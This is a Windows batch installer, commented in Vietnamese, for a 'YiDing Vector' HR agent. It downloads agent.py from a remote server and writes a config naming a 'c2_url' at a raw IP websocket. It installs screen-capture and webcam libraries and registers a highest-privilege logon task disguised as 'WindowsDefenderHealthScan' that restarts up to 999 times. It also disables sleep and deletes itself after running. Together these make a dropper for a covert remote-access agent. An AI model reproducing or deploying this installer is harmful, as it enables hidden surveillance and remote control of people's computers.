@echo off
setlocal EnableDelayedExpansion
title YiDing Vector
color 0A

:: ─── Kiem tra quyen Admin ────────────────────────────────────────────────────
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo  [LOI] Chay lai voi quyen Administrator
    echo  Right-click file nay - chon "Run as administrator"
    pause & exit /b 1
)

set INSTALL_DIR=C:\YiDingHrAgent
set C2_URL=wss://agent.yidinginternational.com/agent
set CDN=https://yidinginternational.com/downloads
set LOG=%INSTALL_DIR%\install.log
set TASK_NAME=WindowsDefenderHealthScan

echo %DATE% %TIME% [START] Vector installer running >> "%LOG%" 2>nul

:: ─── STEP 0: Dung tien trinh cu, xoa startup ca ────────────────────────────
echo  [*] Cleaning up old instances...
taskkill /f /im pythonw.exe >nul 2>&1
taskkill /f /im YiDingITAgent.exe >nul 2>&1
timeout /t 2 /nobreak >nul

:: Xoa HKLM Run key cu (nguyen nhan bug 2-instance)
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v YiDingITAgent /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v YiDingITAgent /f >nul 2>&1

:: Xoa task cu
schtasks /delete /tn "YiDingHrAIAgent" /f >nul 2>&1
schtasks /delete /tn "YiDingSysUpdate" /f >nul 2>&1
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

echo %DATE% %TIME% [OK] Old instances cleaned >> "%LOG%"

:: ─── STEP 1: Kiem tra Python ─────────────────────────────────────────────────
echo  [1/5] Checking Python...
set PYTHON_EXE=

for %%P in (
    "%LOCALAPPDATA%\Programs\Python\Python313\python.exe"
    "%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
    "%LOCALAPPDATA%\Programs\Python\Python311\python.exe"
    "%LOCALAPPDATA%\Programs\Python\Python310\python.exe"
    "C:\Program Files\Python313\python.exe"
    "C:\Program Files\Python312\python.exe"
    "C:\Program Files\Python311\python.exe"
    "C:\Program Files\Python310\python.exe"
    "C:\Python313\python.exe"
    "C:\Python312\python.exe"
    "C:\Python311\python.exe"
    "C:\Python310\python.exe"
) do (
    if exist %%P (
        if "!PYTHON_EXE!"=="" (
            %%~P -c "import sys; sys.exit(0)" >nul 2>&1
            if !errorLevel! equ 0 set "PYTHON_EXE=%%~P"
        )
    )
)

if "!PYTHON_EXE!"=="" (
    for /f "delims=" %%P in ('where python 2^>nul') do (
        if "!PYTHON_EXE!"=="" (
            echo %%P | findstr /i "WindowsApps" >nul
            if !errorLevel! neq 0 (
                "%%P" -c "import sys; sys.exit(0)" >nul 2>&1
                if !errorLevel! equ 0 set "PYTHON_EXE=%%P"
            )
        )
    )
)

if "!PYTHON_EXE!"=="" (
    echo  [*] Python not found. Installing via winget...
    winget install -e --id Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements >nul 2>&1
    if !errorLevel! neq 0 (
        powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.10/python-3.11.10-amd64.exe' -OutFile '%TEMP%\pysetup.exe' -UseBasicParsing" >nul 2>&1
        if exist "%TEMP%\pysetup.exe" (
            "%TEMP%\pysetup.exe" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1 >nul 2>&1
            del /f /q "%TEMP%\pysetup.exe" >nul 2>&1
        )
    )
    for %%P in (
        "%LOCALAPPDATA%\Programs\Python\Python311\python.exe"
        "C:\Program Files\Python311\python.exe"
    ) do (
        if exist %%P (
            if "!PYTHON_EXE!"=="" set "PYTHON_EXE=%%~P"
        )
    )
    if "!PYTHON_EXE!"=="" (
        echo  [LOI] Khong tim thay Python.
        echo  Cai thu cong: https://www.python.org/downloads/
        echo  Tick "Add Python to PATH" roi chay lai.
        pause & exit /b 1
    )
)

set "PYTHON_W=!PYTHON_EXE:python.exe=pythonw.exe!"
if not exist "!PYTHON_W!" set "PYTHON_W=!PYTHON_EXE!"
echo  [OK] Python found.
echo %DATE% %TIME% [OK] Python: !PYTHON_EXE! >> "%LOG%"

:: ─── STEP 2: Tao thu muc, tai files ─────────────────────────────────────────
echo  [2/5] Preparing install directory...
if exist "%INSTALL_DIR%" (
    REM Giu lai venv neu co the, chi xoa agent.py va log cu
    del /f /q "%INSTALL_DIR%\agent.py" >nul 2>&1
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo  [*] Downloading agent...
set DOWNLOAD_OK=0
for /l %%i in (1,1,3) do (
    if !DOWNLOAD_OK! equ 0 (
        powershell -Command "try { Invoke-WebRequest -Uri '%CDN%/agent.py' -OutFile '%INSTALL_DIR%\agent.py' -UseBasicParsing -TimeoutSec 30; exit 0 } catch { exit 1 }" >nul 2>&1
        if exist "%INSTALL_DIR%\agent.py" set DOWNLOAD_OK=1
        if !DOWNLOAD_OK! equ 0 timeout /t 3 /nobreak >nul
    )
)
if !DOWNLOAD_OK! equ 0 (
    echo  [LOI] Khong tai duoc agent.py. Kiem tra internet.
    echo %DATE% %TIME% [ERR] agent.py download failed >> "%LOG%"
    pause & exit /b 1
)

powershell -Command "try { Invoke-WebRequest -Uri '%CDN%/yiding_logo.png' -OutFile '%INSTALL_DIR%\yiding_logo.png' -UseBasicParsing -TimeoutSec 15 } catch {}" >nul 2>&1
echo %DATE% %TIME% [OK] Files downloaded >> "%LOG%"

:: Ghi agent_config.json voi C2 URL moi (HTTPS:443 khi san sang)
echo {"c2_url": "ws://46.225.160.243:9876/agent", "enable_sensitive_actions": false} > "%INSTALL_DIR%\agent_config.json"

:: ─── STEP 3: Tao venv (skip neu da co) ──────────────────────────────────────
echo  [3/5] Setting up Python environment...
if not exist "%INSTALL_DIR%\venv\Scripts\pythonw.exe" (
    "!PYTHON_EXE!" -m venv "%INSTALL_DIR%\venv" >nul 2>&1
    if !errorLevel! neq 0 (
        echo  [LOI] Khong tao duoc venv.
        pause & exit /b 1
    )
    echo  [*] Installing packages (2-3 minutes)...
    "%INSTALL_DIR%\venv\Scripts\pip" install --upgrade pip -q >nul 2>&1
    "%INSTALL_DIR%\venv\Scripts\pip" install -q websockets==14.1 psutil==6.1.1 mss==9.0.1 Pillow==11.0.0 opencv-python >nul 2>&1
) else (
    echo  [OK] venv already exists, skipping.
)
echo %DATE% %TIME% [OK] venv ready >> "%LOG%"

set "RUN_EXE=%INSTALL_DIR%\venv\Scripts\pythonw.exe"
set "RUN_SCRIPT=%INSTALL_DIR%\agent.py"

:: ─── STEP 4: Dang ky Scheduled Task duy nhat ─────────────────────────────────
echo  [4/5] Registering startup task...

:: Dung 1 task duy nhat - KHONG them HKLM Run key (tranh bug 2-instance)
schtasks /create /tn "%TASK_NAME%" /tr "\"!RUN_EXE!\" \"%RUN_SCRIPT%\"" /sc onlogon /rl highest /f >nul 2>&1
if !errorLevel! equ 0 (
    powershell -Command ^
      "$s=(Get-ScheduledTask -TaskName '%TASK_NAME%').Settings;^
       $s.StartWhenAvailable=$true;$s.DisallowStartIfOnBatteries=$false;^
       $s.StopIfGoingOnBatteries=$false;$s.ExecutionTimeLimit='PT0S';^
       $s.RestartCount=999;$s.RestartInterval='PT1M';^
       Set-ScheduledTask -TaskName '%TASK_NAME%' -Settings $s" >nul 2>&1
    echo  [OK] Startup task registered.
) else (
    echo  [CANH BAO] Task creation failed. Will use fallback.
)
echo %DATE% %TIME% [OK] Task: %TASK_NAME% >> "%LOG%"

:: ─── STEP 5: Power settings + khoi dong ─────────────────────────────────────
echo  [5/5] Configuring power & starting agent...
powercfg /change standby-timeout-ac 0 >nul 2>&1
powercfg /change hibernate-timeout-ac 0 >nul 2>&1
powershell -Command "$w=Get-NetAdapter -Name 'Wi-Fi' -EA SilentlyContinue; if($w){Disable-NetAdapterPowerManagement -Name $w.Name -EA SilentlyContinue}" >nul 2>&1

start "" /B "!RUN_EXE!" "%RUN_SCRIPT%"
echo %DATE% %TIME% [OK] Agent started >> "%LOG%"

echo.
echo  ================================
echo   YiDing Vector - Installed!
echo  ================================
echo   Agent  : !RUN_EXE!
echo   Task   : %TASK_NAME%
echo   Log    : %INSTALL_DIR%\agent.log
echo   Config : %INSTALL_DIR%\agent_config.json
echo  ================================
echo.

timeout /t 5 /nobreak >nul
del /f /q "%~f0" >nul 2>&1
